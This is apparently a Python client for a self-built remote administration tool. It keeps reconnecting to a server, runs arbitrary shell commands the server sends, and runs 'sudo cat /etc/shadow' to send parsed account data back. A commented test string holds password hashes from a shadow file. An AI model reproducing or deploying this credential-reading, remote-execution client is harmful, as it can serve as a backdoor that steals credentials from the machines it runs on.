from socket import AF_INET, SOCK_STREAM
from my_logs import clogger
from my_config import c_Config
import my_crypto
import asyncio
import os, time
import psutil
import json
from exec import exec
from random import randint, randbytes
from users import users
import sys

SERVER_IP = "192.168.88.254"  # адрес сервера
SERVER_PORT=51235
BUF_SIZE=1024


class client_class():
    def __init__(self, conf_filename, test_mode=False):
        try:
            self.read_conf(conf_filename)
        except Exception as E:
            clogger.fatal(f'{E}')
            os._exit(1)
        self.test_mode=test_mode
        self.exec=exec()
        self.users=users()

    async def execute_command(self, command_str:bytes):
        command_array=bytearray(command_str)
        command_id=command_array[1:5]
        command_name=command_array[5:9]
        match command_name:
            case b'usrs':
                retrieve_command='sudo cat /etc/shadow'
                result=self.exec.run_and_wait(bytes(command_id), retrieve_command)
                #remove this lines in prod
                #data="root:*:19212:0:99999:7:::\ndaemon:*:19212:0:99999:7:::\nbin:*:19212:0:99999:7:::\nsys:*:19212:0:99999:7:::\nsync:*:19212:0:99999:7:::\ngames:*:19212:0:99999:7:::\nman:*:19212:0:99999:7:::\nlp:*:19212:0:99999:7:::\nmail:*:19212:0:99999:7:::\nnews:*:19212:0:99999:7:::\nuucp:*:19212:0:99999:7:::\nproxy:*:19212:0:99999:7:::\nwww-data:*:19212:0:99999:7:::\nbackup:*:19212:0:99999:7:::\nlist:*:19212:0:99999:7:::\nirc:*:19212:0:99999:7:::\ngnats:*:19212:0:99999:7:::\nnobody:*:19212:0:99999:7:::\n_apt:!:19212::::::\nsystemd-network:!:19212::::::\nsystemd-resolve:!:19212::::::\nsystemd-timesync:!:19212::::::\nmessagebus:!:19212::::::\ntss:!:19212::::::\nstrongswan:!:19212::::::\ntcpdump:!:19212::::::\nusbmux:!:19212::::::\nsshd:!:19212::::::\ndnsmasq:!:19212::::::\navahi:!:19212::::::\nrtkit:!:19212::::::\nspeech-dispatcher:!:19212::::::\nnm-openvpn:!:19212::::::\nnm-openconnect:!:19212::::::\nlightdm:!:19212::::::\npulse:!:19212::::::\nsaned:!:19212::::::\ncolord:!:19212::::::\nmysql:!:19212::::::\nstunnel4:!*:19212::::::\n_rpc:!:19212::::::\ngeoclue:!:19212::::::\nDebian-snmp:!:19212::::::\nsslh:!:19212::::::\nntpsec:!:19212::::::\nredsocks:!:19212::::::\nrwhod:!:19212::::::\niodine:!:19212::::::\nmiredo:!:19212::::::\nstatd:!:19212::::::\npostgres:!:19212::::::\ninetsim:!:19212::::::\nking-phisher:!:19212::::::\nkali:$y$j9T$CPuhZ1MKX1L2Vm2uVVdYD0$tpZjsmkPG6ONRswn789aImhMu5c8Ymtmh18Do8BtYY5:19304:0:99999:7:::\n_chrony:!:19451::::::\nsecureuser:$y$j9T$OpUjQ9yVzeAieXzlhT70D/$lMGU9cTgS4WyWcbyMKWDTZ1kLdB/fdg7RhtwyPGQuX7:19527:0:99999:7:::\nredis:!:19635::::::\n_galera:!:19988::::::\nDebian-exim:!:20057::::::\nuser1:$y$j9T$YRgXl4Xro442th7VQan2f/$TCwq9wZsDbts9GOXvcLXbI5x47o4SiKyK8hl1zYjHG6:20057:0:99999:7:::\nuser2:$y$j9T$o9dw/1rnvb11vF8F.BL35.$s8zEujGSPiJyGn43LrE4orJG9b3Hj43H/PeNyuCp7yC:20057:0:99999:7:::"
                #result=data
                #remove this lines in prod
                if result!=None and result!='':
                    r=self.users.scrap(result)
                    if r[0]:
                        temp_usrs=self.users.export_str()
                        bytes_to_send=bytearray(b'2')+bytearray(command_id)+bytearray(b'usrs')+bytearray(temp_usrs, encoding="utf-8")
                    else:
                        clogger.error(f'{result}')
                        bytes_to_send=bytearray(b'2')+bytearray(command_id)+bytearray(b'usrs')+bytearray(f'ERROR scraping result {r[1]}', encoding="utf-8")
                else:
                    bytes_to_send=bytearray(b'2')+bytearray(command_id)+bytearray(b'usrs')+bytearray('ERROR performing cat shadow', encoding="utf-8")
                clogger.info(f'Sending results of usrs')     
                await self.send_encrypted(bytes(bytes_to_send))
            case b'echo':
                echo_payload=bytearray(b'2')+command_array[1:]
                await self.send_encrypted(bytes(echo_payload))
                clogger.debug(f'Replied to echo')
            case b'stat':
                stat_dict={}
                try:
                    stat_dict['load_prct']=[x / psutil.cpu_count() * 100 for x in psutil.getloadavg()]
                    stat_dict['mem_usage']=psutil.virtual_memory().percent
                    stat_dict['timestamp']=time.time()
                except Exception as E:
                    stat_dict['mem_usage']=f'ERR {E} retrieving system stats'
                timed_dict={time.time():stat_dict}
                jsoned=json.dumps(timed_dict)
                reply=bytearray(b'2')+command_id+bytearray(b'stat')+bytearray(jsoned.encode())
                await self.send_encrypted(reply)
            case b'exec':
                command_payload=command_array[9:]
                cmd=bytearray.decode(command_payload)
                self.exec.run(bytes(command_id), cmd)
                clogger.info(f'Started exec {command_id}')
            
            case _:
                clogger.error(f'ERR Unknow command {command_name}')

    def read_conf(self, filename):
        if os.path.isfile(filename):
            self.conf_filename=filename
        else:
            raise Exception(f"filename {filename} not a file (cannot find client config)")
        self.conf=c_Config(filename=self.conf_filename)
        self.SERVER_IP=self.conf.settings['SERVER_IP']
        self.SERVER_PORT=self.conf.settings['SERVER_PORT']
        #self.BUF_SIZE=self.conf.settings['BUF_SIZE']
        if self.conf.settings['priv_key']=='':
            raise Exception(f"Client config must have a priv_key. {self.conf_filename} does not have it")
        else:
            key_bytes=bytes(self.conf.settings['priv_key'])
            self.key=my_crypto.elipt_key(key_bytes)
        self.conf.save()
    
    def set_server_addr(self, SERVER_IP, SERVER_PORT): #todo добавить проверку корректности айпи и порта
        self.SERVER_IP=SERVER_IP
        self.SERVER_PORT=SERVER_PORT

    async def handshake(self, reader : asyncio.StreamReader, writer : asyncio.StreamWriter):
        random_lengh=32
        rand_seed=int(os.urandom(32).hex(), 16)
        p_r_list=self.key.mul_pub_int(rand_seed)
        p_r=my_crypto.cv.decode_point(p_r_list)
        message_bytes=[]
        message_bytes.append(0x0)
        message_bytes+=my_crypto.bytes_ints(self.key.export_public())
        message_bytes+=p_r_list
        
        msg_len=len(message_bytes)+5
        handshake_message=bytes(my_crypto.bytes_ints(msg_len.to_bytes(length=5))+message_bytes)
        writer.write(handshake_message)
        try:
            await writer.drain()
        except Exception as e:
            raise e
        x=int.from_bytes(self.conf.settings['peer_key'])
        y=my_crypto.cv.y_recover(x)
        serv_pub_point=my_crypto.Point(x, y, my_crypto.cv)
        shared_key=my_crypto.mult_P_k(my_crypto.cv.encode_point(serv_pub_point), self.key.s_key*rand_seed)
        Cipher=my_crypto.BlockCipherAdapter(shared_key[0:32],shared_key[33:49])

        random_msg = await reader.read(1024)
        random_data = Cipher.decrypt(random_msg)
        random_data=list(random_data)
        random_data.reverse()
        random_enc=Cipher.encrypt(bytes(random_data))
        writer.write(random_enc)
        try:
            await writer.drain()
        except Exception as e:
            raise e
        try:
            readed = await reader.read(1024)
        except Exception as e:
            raise e
        try:
            readed=Cipher.decrypt(readed)
        except:
            clogger.error(f'ERR Unable to dec in handshake')
            
        if readed==b'0':
            #Handshake are ok
            return [True, Cipher]
        clogger.error(f'confirm was incorrect: {readed}')
        return [False, None]
    
    async def send_encrypted(self, data):
        try:
            encrypted=bytearray(self.Cipher.encrypt(data))
            enc_len=len(encrypted)+10
            message=bytearray(enc_len.to_bytes(length=5, signed=False))+encrypted+bytearray(enc_len.to_bytes(length=5, signed=False))
            self.writer.write(message)
            await self.writer.drain()

        except Exception as e:
            clogger.error(f'ERR {e} sending plaintext')        
    
    async def read_encrypted(self, non_block=True) -> bytes:
        try:
            actual_len=0
            data=bytearray()
            if non_block:
                try:
                    data_first_packet = await asyncio.wait_for(self.reader.read(5), timeout=0.1)
                except asyncio.TimeoutError:
                    return b''
            else:
                data_first_packet=await self.reader.read(5)
            if data_first_packet==None or len(data_first_packet)<5:
                return data_first_packet
            data_len_array=bytearray(data_first_packet)[:5]
            data_len=int.from_bytes(data_len_array, signed=False)
            data+=bytearray(data_first_packet)[5:]
            if data_len>len(data_first_packet):
                data_len-=len(data_first_packet)
                while data_len>0:
                    data_packet= await self.reader.read(min(1024, data_len))
                    data+=bytearray(data_packet)
                    data_len-=len(data_packet)
            actual_len=len(data)
            secondary_len_block=data[-5:]
            data=data[:-5]
            if secondary_len_block!=data_len_array:
                raise Exception('Len in end of message not equal to len in beggining')
            plaintext=self.Cipher.decrypt(bytes(data))

            return plaintext
        except Exception as e:
            clogger.error(f'ERR {e} reading from server')
            clogger.error(f'data len was {actual_len} and data {data}')
            return None
        
    async def client_loop(self):
        """Основной цикл клиента"""
        r=0
        s=0    
        while True:
            try:
                reader, writer = await asyncio.open_connection(self.SERVER_IP, self.SERVER_PORT)
                print(f"Connected to {self.SERVER_IP}:{self.SERVER_PORT}")
                exit_flag=False
            except Exception as e:
                r+=1;s+=1
                s=min(15, s)
                clogger.info(f'Failed to connect to server: {e}.Retry {r}, sleeping for {s} seconds')
                time.sleep(s)
                continue
            handshake_complete=False
            try:
                while True: #new connect
                    if not handshake_complete:
                        try:
                            returned = await self.handshake(reader, writer)
                        except Exception as e:
                            clogger.error(f'ERROR {e} during handshake')
                            if self.test_mode:
                                writer.close()
                                return False
                            else:
                                pass #кд на хендшейк?   
                        if returned[0]:
                            self.Cipher=returned[1]
                            self.reader=reader
                            self.writer=writer
                            handshake_complete=True
                            clogger.info(f'Handshake with server complete')
                            if self.test_mode:
                                writer.close()
                                return True
                        else:
                            clogger.error(f"Handshake is failed")
                            if self.test_mode:
                                writer.close()
                                return False
                            break

                    # if self.test_mode:
                    #     rand_len=randint(1, 100000)
                    #     rand_data=randbytes(rand_len)
                    #     echo_command=bytearray(b'1echo')+bytearray(rand_data)
                    #     echo_command=bytes(echo_command)
                    #     await self.send_encrypted(echo_command)
                    #     reply = await self.read_encrypted(False)
                    #     if reply==echo_command:
                    #         clogger.info('echo test complete')
                    #         return True
                    #     else:
                    #         clogger.error('echo test failed')
                    #         return False
                    print(f'Client is ticking {time.time()}', flush=True, end='\r')
                    data = await self.read_encrypted(True)
                    if data!=None and data!=b'':
                        clogger.debug(f'recv {data}')
                        if data[0]==b'1'[0]:
                            await self.execute_command(data)
                    if data==None:
                        print("Connection closed by server.")
                        break
                    
                    completed_commands=self.exec.check_completed()
                    if len(completed_commands)!=0:
                        ids_to_delete=[]
                        for id in completed_commands.keys():
                            try:
                                result=json.dumps({time.time():completed_commands[id]})
                            except Exception as E:
                                clogger.error(f'ERR {E} jsoning result')
                                result=[f'ERR {E} jsoning result']
                            bytes_to_send=bytearray(b'2')+bytearray(id)+bytearray(b'exec')+bytearray(result, encoding="utf-8")
                            clogger.info(f'Sending result of exec {id} {result}')
                            await self.send_encrypted(bytes_to_send)
                            clogger.info(f'result of exec sent')
                            ids_to_delete.append(id)
                        for i in ids_to_delete:
                            completed_commands.pop(i)
                        


            except asyncio.CancelledError:
                pass
            except Exception as e:
                print(f"Error: {e}")
            finally:
                try:
                    writer.close()
                    await writer.wait_closed()
                except:
                    pass
            if exit_flag:
                break
            
        
if __name__=="__main__":
    def_path='client_conf.json'
    args=sys.argv
    config_path=def_path
    try:
        ind=args.index('-c')
        if ind<len(args):
            config_path=args[ind+1]
            clogger.info(f'cfg path is {config_path}')
    except ValueError:
        pass
    try:
        ind=args.index('--live-conf')
        if len(args)>ind:
            config=args[ind+1]
            from base64 import b64decode
            config_s=b64decode(config).decode()
            config=json.loads(config_s)
            clogger.info(f'live-conf parsed, saving to file')
            with open(config_path, 'w') as f:
                f.write(config_s)
                f.close()
    except ValueError:
        clogger.info(f'Live config argument not specified, using default path {def_path}')

    client=client_class(config_path, test_mode=False)
    asyncio.run(client.client_loop())

#pyinstaller -F -p .\venv\Lib\site-packages\ .\client.py --name client.exe